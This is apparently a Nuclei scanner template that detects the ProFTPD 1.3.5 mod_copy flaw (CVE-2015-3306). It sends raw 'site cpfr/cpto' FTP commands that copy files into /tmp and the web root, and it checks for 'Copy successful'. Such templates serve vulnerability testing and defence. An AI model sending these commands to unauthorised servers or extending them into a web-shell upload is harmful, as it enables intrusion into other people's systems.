id: CVE-2015-3306

info:
  name: ProFTPd - Remote Code Execution
  author: pdteam
  severity: high
  description: ProFTPD 1.3.5 contains a remote code execution vulnerability via the mod_copy module which allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.
  reference:
    - https://github.com/t0kx/exploit-CVE-2015-3306
    - https://www.exploit-db.com/exploits/36803/
    - http://lists.fedoraproject.org/pipermail/package-announce/2015-May/157053.html
    - http://lists.fedoraproject.org/pipermail/package-announce/2015-May/157054.html
    - https://nvd.nist.gov/vuln/detail/CVE-2015-3306
  classification:
    cve-id: CVE-2015-3306
  tags: cve,cve2015,ftp,rce,network,proftpd,edb

network:
  - inputs:
      - data: "site cpfr /proc/self/cmdline\r\n"
        read: 1024
      - data: "site cpto /tmp/.{{randstr}}\r\n"
        read: 1024
      - data: "site cpfr /tmp/.{{randstr}}\r\n"
        read: 1024
      - data: "site cpto /var/www/html/{{randstr}}\r\n"

    host:
      - "{{Hostname}}"
      - "{{Host}}:21"

    read-size: 1024
    matchers:
      - type: word
        part: raw
        words:
          - "Copy successful"

# Enhanced by mp on 2022/06/08
